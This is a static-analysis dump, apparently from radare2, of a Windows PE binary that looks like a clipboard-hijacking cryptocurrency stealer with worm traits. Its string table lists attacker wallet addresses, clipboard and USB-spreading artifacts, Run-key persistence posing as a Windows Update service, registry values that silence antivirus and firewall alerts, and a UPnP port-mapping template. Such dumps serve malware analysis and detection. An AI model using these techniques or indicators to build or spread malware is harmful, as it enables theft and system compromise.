Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0xb200 0x00401000  0xc000 -r-x .text
1   0x0000b600  0x2600 0x0040d000  0x3000 -r-- .rdata
2   0x0000dc00   0x800 0x00410000  0x2000 -rw- .data

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x00404a20 paddr=0x00003e20 haddr=0x00000120 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr      bind type lib          name
1   0x0000b8b4 0x0040d2b4 NONE FUNC 0    ole32.dll    imp.CoInitialize
2   0x0000b8b8 0x0040d2b8 NONE FUNC 0    ole32.dll    imp.CoUninitialize
3   0x0000b8bc 0x0040d2bc NONE FUNC 0    ole32.dll    imp.CoInitializeEx
4   0x0000b8c0 0x0040d2c0 NONE FUNC 0    ole32.dll    imp.CoCreateInstance
6   0x0000b740 0x0040d140 NONE FUNC 0    OLEAUT32.dll imp.SysStringLen
2   0x0000b744 0x0040d144 NONE FUNC 0    OLEAUT32.dll imp.SysReAllocString
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000b8ca 0x0040d2ca 4   5    .rdata  ascii   3)6{
1   0x0000b917 0x0040d317 17  18   .rdata  ascii   F0123456789abcdef
2   0x0000b92c 0x0040d32c 12  26   .rdata  utf16le bitcoincash:
3   0x0000b948 0x0040d348 6   14   .rdata  utf16le cosmos
4   0x0000b958 0x0040d358 4   10   .rdata  utf16le addr
5   0x0000b964 0x0040d364 21  22   .rdata  ascii   13537267282679196401L
6   0x0000b97c 0x0040d37c 48  49   .rdata  ascii   14T6qgnx6kQrxgr6asZR8UwvSYuLWUq3AHEUyArFbropQRWp
7   0x0000b9b0 0x0040d3b0 34  35   .rdata  ascii   12ZcTiGZFWydqY4rDW6FbF1ArsBbdNaPxz
8   0x0000b9d4 0x0040d3d4 35  36   .rdata  ascii   3P99cyMypyaBthhNh1VLrtF7gjsHNxooth5
9   0x0000b9f8 0x0040d3f8 34  35   .rdata  ascii   3NNJW9YnKichMXTVgAhrsD65veUBCfGC9m
10  0x0000ba1c 0x0040d41c 42  43   .rdata  ascii   qps3rmvkxc2qe0dxlffnxe6jvv90xtp8tcxquxva6v
11  0x0000ba48 0x0040d448 34  35   .rdata  ascii   XkTJhYh432bGU2dMScEWmNLfyNTun3n52p
12  0x0000ba6c 0x0040d46c 34  35   .rdata  ascii   DMfPdibKCp79N5sLqsLkqx7W7gyzS8dhK6
13  0x0000ba90 0x0040d490 42  43   .rdata  ascii   0xEa375AfbDa5e11af6F93932ef2dcDe2Cf38768Dd
14  0x0000babc 0x0040d4bc 34  35   .rdata  ascii   LhqqjWGpEEKDnZZVozMqYVax9zAzjQPJMW
15  0x0000bae0 0x0040d4e0 34  35   .rdata  ascii   r3qS691ECDBqnCAa2Xq26HF55R38pyd2SU
16  0x0000bb04 0x0040d504 34  35   .rdata  ascii   TMumxbBnZn723FeqRnjZUbfvVvvmNaEyEY
17  0x0000bb28 0x0040d528 35  36   .rdata  ascii   t1J1JV7W2DgMbJCmzv3DKq69erCQ9sM7J8G
18  0x0000bb4c 0x0040d54c 36  37   .rdata  ascii   tz1MQTA4y7zjDP8E3f7JxJpqA768QvhkQtwQ
19  0x0000bb74 0x0040d574 42  43   .rdata  ascii   hx76ca924ed3a86365aa684755d07ff587399a44a3
20  0x0000bba0 0x0040d5a0 34  35   .rdata  ascii   QQyZHrgfAZUm6bqf19u3TZRfLU1szkWdAK
21  0x0000bbc4 0x0040d5c4 34  35   .rdata  ascii   RWGY1zEN78ivFTZiMtiLLXYugjUM2Ezgdn
22  0x0000bbe8 0x0040d5e8 40  41   .rdata  ascii   NDV3Q755N5RLBJIHD7O2MDQLHF7BGY7C5UFHJQJD
23  0x0000bc14 0x0040d614 34  35   .rdata  ascii   Aa6J2zX3FmXqZ1Vr6KB7SHEJeDQgZ9L1m9
24  0x0000bc38 0x0040d638 34  35   .rdata  ascii   SW7RcT7KzjDRZUeo33ULvuvgnk1vsfRu9h
25  0x0000bc60 0x0040d660 78  79   .rdata  ascii   zs1gdxkmsegruyeu72ehpfwgshmcup4sqxm7kafju9r7xjcfww8vlg7ar9rqraxmjhr9rdn2hj9v7w
26  0x0000bcb0 0x0040d6b0 42  43   .rdata  ascii   zil1ks8wccts9uum532l6mt7zfn7v3grplu5plc7rd
27  0x0000bcdc 0x0040d6dc 35  36   .rdata  ascii   s1QvSmGpRS7hxnjjfLvCkeDmy3MprJkpWBe
28  0x0000bd00 0x0040d700 11  24   .rdata  utf16le bitcoincash
29  0x0000bd18 0x0040d718 54  55   .rdata  ascii   bitcoincash:qps3rmvkxc2qe0dxlffnxe6jvv90xtp8tcxquxva6v
30  0x0000bd50 0x0040d750 45  46   .rdata  ascii   cosmos18uv6asl0trdgeu0gajph8amh30qskjfeu7xsxf
31  0x0000bd80 0x0040d780 95  96   .rdata  ascii   46JBkCw1vWw2torA5cF6WwdPsjc4EziJE62PHWBKqkLmXVonQjSM5jk5zp1QfSjj2wPjzoLU64qGReNNouP2LLKBMJAZgbr
32  0x0000bde0 0x0040d7e0 103 104  .rdata  ascii   addr1q82kgwmvcs3lcfaws5rq30cq94ek9nzqygcfj2a6045hpg8yjrm9xsu92x0lv30wldh80xqwtmxrc3jfetrzvnmstchq00s0sh
33  0x0000be48 0x0040d848 34  35   .rdata  ascii   FWjKuczvp1fBH95y6c5j3koVX2TZDVR3V9
34  0x0000be6c 0x0040d86c 56  57   .rdata  ascii   GB47TTMWVEURE5VW5NN56QFDW7X2OOSXKLL6KJIB4FQ3YMRUZXXE7P7W
35  0x0000bea8 0x0040d8a8 34  35   .rdata  ascii   GgY5yz2QmGk9jtk6WZ9dTYjt4oQumDpQS2
36  0x0000bed4 0x0040d8d4 42  43   .rdata  ascii   bnb1ssq338y72jd2l0h53ujc8hn8ef9axa2d372gga
37  0x0000bf00 0x0040d900 4   10   .rdata  utf16le band
38  0x0000bf0c 0x0040d90c 43  44   .rdata  ascii   band17rdtnrylr8dlt88qpzqp8j588h5w2qnclf764u
39  0x0000bf40 0x0040d940 42  43   .rdata  ascii   bc1q6rzlelsxd9xadajkjwqdwr72rl9ll7g29yxzqr
40  0x0000bf6c 0x0040d96c 9   10   .rdata  ascii   U30212907
41  0x0000bf78 0x0040d978 9   10   .rdata  ascii   E30940134
42  0x0000bf84 0x0040d984 9   10   .rdata  ascii   B30912949
43  0x0000bf90 0x0040d990 4   10   .rdata  utf16le %x%X
44  0x0000bfa2 0x0040d9a2 5   12   .rdata  utf16le P\??\
45  0x0000bfb0 0x0040d9b0 59  120  .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
46  0x0000c028 0x0040da28 8   18   .rdata  utf16le NoDrives
47  0x0000c03c 0x0040da3c 16  34   .rdata  utf16le %s\VolDriver.exe
48  0x0000c060 0x0040da60 21  44   .rdata  utf16le %windir%\explorer.exe
49  0x0000c08c 0x0040da8c 4   10   .rdata  utf16le %s\*
50  0x0000c0a4 0x0040daa4 5   12   .rdata  utf16le %s\%s
51  0x0000c0b0 0x0040dab0 6   14   .rdata  utf16le %s.lnk
52  0x0000c0c0 0x0040dac0 19  40   .rdata  utf16le %s\%s\VolDriver.exe
53  0x0000c0e8 0x0040dae8 11  24   .rdata  utf16le shell32.dll
54  0x0000c100 0x0040db00 5   12   .rdata  utf16le *.lnk
55  0x0000c10c 0x0040db0c 5   12   .rdata  utf16le *.vbs
56  0x0000c118 0x0040db18 4   10   .rdata  utf16le *.js
57  0x0000c124 0x0040db24 10  22   .rdata  utf16le *.inf*.scr
58  0x0000c13c 0x0040db3c 5   12   .rdata  utf16le *.com
59  0x0000c148 0x0040db48 5   12   .rdata  utf16le *.jse
60  0x0000c154 0x0040db54 5   12   .rdata  utf16le *.cmd
61  0x0000c160 0x0040db60 5   12   .rdata  utf16le *.pif
62  0x0000c16c 0x0040db6c 5   12   .rdata  utf16le *.jar
63  0x0000c178 0x0040db78 5   12   .rdata  utf16le *.dll
64  0x0000c184 0x0040db84 5   12   .rdata  utf16le *.vbe
65  0x0000c190 0x0040db90 5   12   .rdata  utf16le *.bat
66  0x0000c19c 0x0040db9c 9   20   .rdata  utf16le Thumbs.db
67  0x0000c1b0 0x0040dbb0 12  26   .rdata  utf16le $RECYCLE.BIN
68  0x0000c1cc 0x0040dbcc 11  24   .rdata  utf16le desktop.ini
69  0x0000c1e4 0x0040dbe4 25  52   .rdata  utf16le System Volume Information
70  0x0000c218 0x0040dc18 8   18   .rdata  utf16le %s\%s\%s
71  0x0000c22c 0x0040dc2c 7   16   .rdata  utf16le  (%dGB)
72  0x0000c23c 0x0040dc3c 14  30   .rdata  utf16le Unnamed volume
73  0x0000c25c 0x0040dc5c 4   10   .rdata  utf16le %s%s
74  0x0000c268 0x0040dc68 21  44   .rdata  utf16le Microsoft Corporation
75  0x0000c296 0x0040dc96 4   5    .rdata  ascii   L09n
76  0x0000c2b8 0x0040dcb8 4   5    .rdata  ascii   b'kJ
77  0x0000c2d3 0x0040dcd3 8   9    .rdata  ascii   Phttp://
78  0x0000c2dc 0x0040dcdc 5   6    .rdata  ascii   TWiZT
79  0x0000c2e4 0x0040dce4 13  28   .rdata  utf16le winupsvcs.exe
80  0x0000c300 0x0040dd00 32  66   .rdata  utf16le Microsoft Windows Update Service
81  0x0000c344 0x0040dd44 18  38   .rdata  utf16le %s:Zone.Identifier
82  0x0000c36c 0x0040dd6c 12  26   .rdata  utf16le winupsvc.exe
83  0x0000c388 0x0040dd88 13  28   .rdata  utf16le %userprofile%
84  0x0000c3a8 0x0040dda8 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
85  0x0000c408 0x0040de08 34  35   .rdata  ascii   SOFTWARE\Microsoft\Security Center
86  0x0000c42c 0x0040de2c 16  17   .rdata  ascii   FirewallOverride
87  0x0000c440 0x0040de40 21  22   .rdata  ascii   FirewallDisableNotify
88  0x0000c458 0x0040de58 19  20   .rdata  ascii   AntiSpywareOverride
89  0x0000c46c 0x0040de6c 17  18   .rdata  ascii   AntiVirusOverride
90  0x0000c480 0x0040de80 22  23   .rdata  ascii   AntiVirusDisableNotify
91  0x0000c498 0x0040de98 15  16   .rdata  ascii   UpdatesOverride
92  0x0000c4a8 0x0040dea8 20  21   .rdata  ascii   UpdatesDisableNotify
93  0x0000c4c0 0x0040dec0 38  39   .rdata  ascii   SOFTWARE\Microsoft\Security Center\Svc
94  0x0000c4e8 0x0040dee8 15  32   .rdata  utf16le %s\nodescfg.dat
95  0x0000c508 0x0040df08 13  28   .rdata  utf16le %s\cmdcfg.dat
96  0x0000c531 0x0040df31 8   11   .rdata  utf8    Ȫ4d(2dwh blocks=Latin Extended-B,Basic Latin
97  0x0000c567 0x0040df67 5   6    .rdata  ascii   T1`m\n
98  0x0000c56f 0x0040df6f 4   5    .rdata  ascii   J\r."
99  0x0000c59b 0x0040df9b 5   6    .rdata  ascii   c"5o\r
100 0x0000c5af 0x0040dfaf 25  26   .rdata  ascii   swww.update.microsoft.com
101 0x0000c5cc 0x0040dfcc 6   7    .rdata  ascii   twizt)
102 0x0000c5d8 0x0040dfd8 15  16   .rdata  ascii   HTTP/1.1 200 OK
103 0x0000c5e8 0x0040dfe8 10  11   .rdata  ascii   LOCATION: 
104 0x0000c5f4 0x0040dff4 15  16   .rdata  ascii   239.255.255.250
105 0x0000c608 0x0040e008 135 136  .rdata  ascii   M-SEARCH * HTTP/1.1\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMX: 3\r\nMan:"ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n
106 0x0000c690 0x0040e090 7   16   .rdata  utf16le service
107 0x0000c6a0 0x0040e0a0 11  24   .rdata  utf16le serviceType
108 0x0000c6b8 0x0040e0b8 11  24   .rdata  utf16le serviceList
109 0x0000c6d0 0x0040e0d0 6   14   .rdata  utf16le device
110 0x0000c6e0 0x0040e0e0 10  22   .rdata  utf16le deviceType
111 0x0000c6f8 0x0040e0f8 10  22   .rdata  utf16le deviceList
112 0x0000c710 0x0040e110 51  104  .rdata  utf16le urn:schemas-upnp-org:device:InternetGatewayDevice:1
113 0x0000c778 0x0040e178 39  80   .rdata  utf16le urn:schemas-upnp-org:device:WANDevice:1
114 0x0000c7c8 0x0040e1c8 49  100  .rdata  utf16le urn:schemas-upnp-org:device:WANConnectionDevice:1
115 0x0000c830 0x0040e230 46  94   .rdata  utf16le urn:schemas-upnp-org:service:WANIPConnection:1
116 0x0000c890 0x0040e290 47  96   .rdata  utf16le urn:schemas-upnp-org:service:WANPPPConnection:1
117 0x0000c8f0 0x0040e2f0 10  22   .rdata  utf16le controlURL
118 0x0000c908 0x0040e308 7   16   .rdata  utf16le URLBase
119 0x0000c918 0x0040e318 4   5    .rdata  ascii   %S%S
120 0x0000c920 0x0040e320 46  47   .rdata  ascii   Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
121 0x0000c950 0x0040e350 4   5    .rdata  ascii   POST
122 0x0000c958 0x0040e358 103 104  .rdata  ascii   Content-Type: text/xml; charset="utf-8"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n
123 0x0000c9c0 0x0040e3c0 641 642  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost></NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n<NewInternalPort>%d</NewInternalPort>\r\n<NewInternalClient>%s</NewInternalClient>\r\n<NewEnabled>1</NewEnabled>\r\n<NewPortMappingDescription></NewPortMappingDescription>\r\n<NewLeaseDuration>0</NewLeaseDuration>\r\n</m:AddPortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
124 0x0000cc48 0x0040e648 75  76   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
125 0x0000cc94 0x0040e694 6   14   .rdata  utf16le %temp%
126 0x0000cca4 0x0040e6a4 11  24   .rdata  utf16le %s\%d%d.exe
127 0x0000ccc0 0x0040e6c0 114 230  .rdata  utf16le Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
128 0x0000d198 0x0040eb98 10  11   .rdata  ascii   WS2_32.dll
129 0x0000d1a6 0x0040eba6 7   8    .rdata  ascii   StrStrW
130 0x0000d1b0 0x0040ebb0 15  16   .rdata  ascii   PathFileExistsW
131 0x0000d1c2 0x0040ebc2 8   9    .rdata  ascii   StrCmpNW
132 0x0000d1ce 0x0040ebce 14  15   .rdata  ascii   PathMatchSpecW
133 0x0000d1e0 0x0040ebe0 17  18   .rdata  ascii   PathFindFileNameW
134 0x0000d1f4 0x0040ebf4 8   9    .rdata  ascii   StrStrIA
135 0x0000d200 0x0040ec00 7   8    .rdata  ascii   StrChrA
136 0x0000d20a 0x0040ec0a 9   10   .rdata  ascii   StrCmpNIA
137 0x0000d214 0x0040ec14 11  12   .rdata  ascii   SHLWAPI.dll
138 0x0000d222 0x0040ec22 16  17   .rdata  ascii   InternetConnectA
139 0x0000d236 0x0040ec36 17  18   .rdata  ascii   InternetCrackUrlA
140 0x0000d24a 0x0040ec4a 16  17   .rdata  ascii   InternetReadFile
141 0x0000d25e 0x0040ec5e 16  17   .rdata  ascii   HttpOpenRequestA
142 0x0000d272 0x0040ec72 22  23   .rdata  ascii   HttpAddRequestHeadersA
143 0x0000d28c 0x0040ec8c 16  17   .rdata  ascii   HttpSendRequestA
144 0x0000d2a0 0x0040eca0 13  14   .rdata  ascii   InternetOpenA
145 0x0000d2b0 0x0040ecb0 19  20   .rdata  ascii   InternetCloseHandle
146 0x0000d2c6 0x0040ecc6 13  14   .rdata  ascii   InternetOpenW
147 0x0000d2d6 0x0040ecd6 16  17   .rdata  ascii   InternetOpenUrlW
148 0x0000d2e8 0x0040ece8 11  12   .rdata  ascii   WININET.dll
149 0x0000d2f6 0x0040ecf6 7   8    .rdata  ascii   isalpha
150 0x0000d300 0x0040ed00 7   8    .rdata  ascii   isdigit
151 0x0000d30a 0x0040ed0a 6   7    .rdata  ascii   strstr
152 0x0000d314 0x0040ed14 7   8    .rdata  ascii   memmove
153 0x0000d31e 0x0040ed1e 17  18   .rdata  ascii   NtQuerySystemTime
154 0x0000d332 0x0040ed32 25  26   .rdata  ascii   RtlTimeToSecondsSince1980
155 0x0000d34e 0x0040ed4e 8   9    .rdata  ascii   mbstowcs
156 0x0000d358 0x0040ed58 9   10   .rdata  ascii   ntdll.dll
157 0x0000d364 0x0040ed64 10  11   .rdata  ascii   _vscprintf
158 0x0000d372 0x0040ed72 4   5    .rdata  ascii   rand
159 0x0000d37a 0x0040ed7a 5   6    .rdata  ascii   srand
160 0x0000d380 0x0040ed80 10  11   .rdata  ascii   msvcrt.dll
161 0x0000d38e 0x0040ed8e 8   9    .rdata  ascii   lstrlenA
162 0x0000d39a 0x0040ed9a 10  11   .rdata  ascii   GlobalLock
163 0x0000d3a8 0x0040eda8 16  17   .rdata  ascii   GetModuleHandleW
164 0x0000d3bc 0x0040edbc 12  13   .rdata  ascii   GetTickCount
165 0x0000d3cc 0x0040edcc 11  12   .rdata  ascii   GlobalAlloc
166 0x0000d3da 0x0040edda 5   6    .rdata  ascii   Sleep
167 0x0000d3e2 0x0040ede2 9   10   .rdata  ascii   lstrcpynW
168 0x0000d3ee 0x0040edee 10  11   .rdata  ascii   ExitThread
169 0x0000d3fc 0x0040edfc 19  20   .rdata  ascii   MultiByteToWideChar
170 0x0000d412 0x0040ee12 8   9    .rdata  ascii   lstrlenW
171 0x0000d41e 0x0040ee1e 12  13   .rdata  ascii   GlobalUnlock
172 0x0000d42e 0x0040ee2e 11  12   .rdata  ascii   GetFileSize
173 0x0000d43c 0x0040ee3c 13  14   .rdata  ascii   MapViewOfFile
174 0x0000d44c 0x0040ee4c 15  16   .rdata  ascii   UnmapViewOfFile
175 0x0000d45e 0x0040ee5e 9   10   .rdata  ascii   WriteFile
176 0x0000d46a 0x0040ee6a 25  26   .rdata  ascii   InitializeCriticalSection
177 0x0000d486 0x0040ee86 20  21   .rdata  ascii   LeaveCriticalSection
178 0x0000d49e 0x0040ee9e 11  12   .rdata  ascii   CreateFileW
179 0x0000d4ac 0x0040eeac 16  17   .rdata  ascii   FlushFileBuffers
180 0x0000d4c0 0x0040eec0 20  21   .rdata  ascii   EnterCriticalSection
181 0x0000d4d8 0x0040eed8 18  19   .rdata  ascii   CreateFileMappingW
182 0x0000d4ee 0x0040eeee 11  12   .rdata  ascii   CloseHandle
183 0x0000d4fc 0x0040eefc 14  15   .rdata  ascii   FindFirstFileW
184 0x0000d50e 0x0040ef0e 13  14   .rdata  ascii   GetDriveTypeW
185 0x0000d51e 0x0040ef1e 11  12   .rdata  ascii   MoveFileExW
186 0x0000d52c 0x0040ef2c 16  17   .rdata  ascii   CreateDirectoryW
187 0x0000d540 0x0040ef40 16  17   .rdata  ascii   GetLogicalDrives
188 0x0000d554 0x0040ef54 9   10   .rdata  ascii   CopyFileW
189 0x0000d560 0x0040ef60 18  19   .rdata  ascii   GetModuleFileNameW
190 0x0000d576 0x0040ef76 8   9    .rdata  ascii   lstrcmpW
191 0x0000d582 0x0040ef82 9   10   .rdata  ascii   FindClose
192 0x0000d58e 0x0040ef8e 16  17   .rdata  ascii   RemoveDirectoryW
193 0x0000d5a2 0x0040efa2 15  16   .rdata  ascii   QueryDosDeviceW
194 0x0000d5b4 0x0040efb4 9   10   .rdata  ascii   lstrcmpiW
195 0x0000d5c0 0x0040efc0 13  14   .rdata  ascii   FindNextFileW
196 0x0000d5d0 0x0040efd0 19  20   .rdata  ascii   GetDiskFreeSpaceExW
197 0x0000d5e6 0x0040efe6 11  12   .rdata  ascii   DeleteFileW
198 0x0000d5f4 0x0040eff4 8   9    .rdata  ascii   lstrcpyW
199 0x0000d600 0x0040f000 18  19   .rdata  ascii   SetFileAttributesW
200 0x0000d616 0x0040f016 21  22   .rdata  ascii   GetVolumeInformationW
201 0x0000d62e 0x0040f02e 11  12   .rdata  ascii   ExitProcess
202 0x0000d63c 0x0040f03c 12  13   .rdata  ascii   CreateEventA
203 0x0000d64c 0x0040f04c 12  13   .rdata  ascii   GetLastError
204 0x0000d65c 0x0040f05c 12  13   .rdata  ascii   CreateMutexA
205 0x0000d66c 0x0040f06c 12  13   .rdata  ascii   CreateThread
206 0x0000d67c 0x0040f07c 25  26   .rdata  ascii   ExpandEnvironmentStringsW
207 0x0000d698 0x0040f098 11  12   .rdata  ascii   HeapReAlloc
208 0x0000d6a6 0x0040f0a6 9   10   .rdata  ascii   HeapAlloc
209 0x0000d6b2 0x0040f0b2 8   9    .rdata  ascii   HeapFree
210 0x0000d6be 0x0040f0be 10  11   .rdata  ascii   HeapCreate
211 0x0000d6cc 0x0040f0cc 12  13   .rdata  ascii   HeapValidate
212 0x0000d6dc 0x0040f0dc 15  16   .rdata  ascii   GetProcessHeaps
213 0x0000d6ee 0x0040f0ee 18  19   .rdata  ascii   HeapSetInformation
214 0x0000d704 0x0040f104 19  20   .rdata  ascii   GetCurrentProcessId
215 0x0000d71a 0x0040f11a 20  21   .rdata  ascii   InterlockedDecrement
216 0x0000d732 0x0040f132 19  20   .rdata  ascii   WaitForSingleObject
217 0x0000d748 0x0040f148 19  20   .rdata  ascii   InterlockedExchange
218 0x0000d75e 0x0040f15e 20  21   .rdata  ascii   InterlockedIncrement
219 0x0000d776 0x0040f176 22  23   .rdata  ascii   InterlockedExchangeAdd
220 0x0000d790 0x0040f190 16  17   .rdata  ascii   GetCurrentThread
221 0x0000d7a4 0x0040f1a4 17  18   .rdata  ascii   SetThreadPriority
222 0x0000d7b8 0x0040f1b8 17  18   .rdata  ascii   GetThreadPriority
223 0x0000d7cc 0x0040f1cc 21  22   .rdata  ascii   DeleteCriticalSection
224 0x0000d7e4 0x0040f1e4 14  15   .rdata  ascii   CreateProcessW
225 0x0000d7f4 0x0040f1f4 12  13   .rdata  ascii   KERNEL32.dll
226 0x0000d804 0x0040f204 18  19   .rdata  ascii   SetClipboardViewer
227 0x0000d81a 0x0040f21a 16  17   .rdata  ascii   SetClipboardData
228 0x0000d82e 0x0040f22e 13  14   .rdata  ascii   OpenClipboard
229 0x0000d83e 0x0040f23e 16  17   .rdata  ascii   DispatchMessageA
230 0x0000d852 0x0040f252 15  16   .rdata  ascii   CreateWindowExW
231 0x0000d864 0x0040f264 23  24   .rdata  ascii   RegisterRawInputDevices
232 0x0000d87e 0x0040f27e 14  15   .rdata  ascii   DefWindowProcA
233 0x0000d890 0x0040f290 14  15   .rdata  ascii   SetWindowLongW
234 0x0000d8a2 0x0040f2a2 20  21   .rdata  ascii   ChangeClipboardChain
235 0x0000d8ba 0x0040f2ba 14  15   .rdata  ascii   EmptyClipboard
236 0x0000d8cc 0x0040f2cc 16  17   .rdata  ascii   GetClipboardData
237 0x0000d8e0 0x0040f2e0 14  15   .rdata  ascii   GetWindowLongW
238 0x0000d8f2 0x0040f2f2 16  17   .rdata  ascii   RegisterClassExW
239 0x0000d906 0x0040f306 16  17   .rdata  ascii   TranslateMessage
240 0x0000d91a 0x0040f31a 9   10   .rdata  ascii   wsprintfW
241 0x0000d926 0x0040f326 12  13   .rdata  ascii   SendMessageA
242 0x0000d936 0x0040f336 26  27   .rdata  ascii   IsClipboardFormatAvailable
243 0x0000d954 0x0040f354 14  15   .rdata  ascii   CloseClipboard
244 0x0000d966 0x0040f366 11  12   .rdata  ascii   GetMessageA
245 0x0000d974 0x0040f374 10  11   .rdata  ascii   wvsprintfA
246 0x0000d980 0x0040f380 10  11   .rdata  ascii   USER32.dll
247 0x0000d98e 0x0040f38e 16  17   .rdata  ascii   RegQueryValueExW
248 0x0000d9a2 0x0040f3a2 13  14   .rdata  ascii   RegOpenKeyExW
249 0x0000d9b2 0x0040f3b2 11  12   .rdata  ascii   RegCloseKey
250 0x0000d9c0 0x0040f3c0 14  15   .rdata  ascii   RegSetValueExA
251 0x0000d9d2 0x0040f3d2 13  14   .rdata  ascii   RegOpenKeyExA
252 0x0000d9e2 0x0040f3e2 14  15   .rdata  ascii   RegSetValueExW
253 0x0000d9f4 0x0040f3f4 20  21   .rdata  ascii   CryptAcquireContextW
254 0x0000da0c 0x0040f40c 19  20   .rdata  ascii   CryptReleaseContext
255 0x0000da22 0x0040f422 14  15   .rdata  ascii   CryptGenRandom
256 0x0000da32 0x0040f432 12  13   .rdata  ascii   ADVAPI32.dll
257 0x0000da42 0x0040f442 16  17   .rdata  ascii   CoCreateInstance
258 0x0000da56 0x0040f456 12  13   .rdata  ascii   CoInitialize
259 0x0000da66 0x0040f466 14  15   .rdata  ascii   CoUninitialize
260 0x0000da78 0x0040f478 14  15   .rdata  ascii   CoInitializeEx
261 0x0000da88 0x0040f488 9   10   .rdata  ascii   ole32.dll
262 0x0000da92 0x0040f492 12  13   .rdata  ascii   OLEAUT32.dll
263 0x0000daa2 0x0040f4a2 24  25   .rdata  ascii   WSAWaitForMultipleEvents
264 0x0000dabe 0x0040f4be 10  11   .rdata  ascii   WSASocketA
265 0x0000dacc 0x0040f4cc 14  15   .rdata  ascii   WSACreateEvent
266 0x0000dade 0x0040f4de 22  23   .rdata  ascii   WSAGetOverlappedResult
267 0x0000daf8 0x0040f4f8 14  15   .rdata  ascii   WSAEventSelect
268 0x0000db0a 0x0040f50a 20  21   .rdata  ascii   WSAEnumNetworkEvents
269 0x0000db22 0x0040f522 7   8    .rdata  ascii   WSASend
270 0x0000db2c 0x0040f52c 7   8    .rdata  ascii   WSARecv
271 0x0000db36 0x0040f536 13  14   .rdata  ascii   WSACloseEvent
272 0x0000db46 0x0040f546 8   9    .rdata  ascii   SetEvent
273 0x0000db52 0x0040f552 22  23   .rdata  ascii   CreateIoCompletionPort
274 0x0000db6c 0x0040f56c 25  26   .rdata  ascii   GetQueuedCompletionStatus
275 0x0000db88 0x0040f588 26  27   .rdata  ascii   PostQueuedCompletionStatus
276 0x0000dba6 0x0040f5a6 13  14   .rdata  ascii   GetSystemInfo
277 0x0000dbb6 0x0040f5b6 6   7    .rdata  ascii   memset
278 0x0000dbc0 0x0040f5c0 6   7    .rdata  ascii   memcpy
279 0x0000dbca 0x0040f5ca 7   8    .rdata  ascii   _chkstk
280 0x0000dbd4 0x0040f5d4 9   10   .rdata  ascii   RtlUnwind
281 0x0000dbe0 0x0040f5e0 20  21   .rdata  ascii   NtQueryVirtualMemory
0   0x0000dc15 0x00410015 4   6    .data   utf8    ېap3 blocks=Arabic,Basic Latin
1   0x0000dc35 0x00410035 4   7    .data   utf8    賳%u] blocks=CJK Unified Ideographs,Basic Latin
2   0x0000dc88 0x00410088 5   6    .data   ascii   CYT]K
3   0x0000dce8 0x004100e8 4   5    .data   ascii   IX@y
4   0x0000dcf3 0x004100f3 4   8    .data   utf8    `ød, blocks=Basic Latin,Latin-1 Supplement
5   0x0000dd40 0x00410140 19  80   .data   utf32le %)+/5;=CGIOSYaegkmq
6   0x0000dfe8 0x004103e8 19  80   .data   utf32le %)+/5;=CGIOSYaegkmq
arch     x86
baddr    0x400000
binsz    58368
bintype  pe
bits     32
canary   true
retguard false
class    PE32
cmp.csum 0x0000eb45
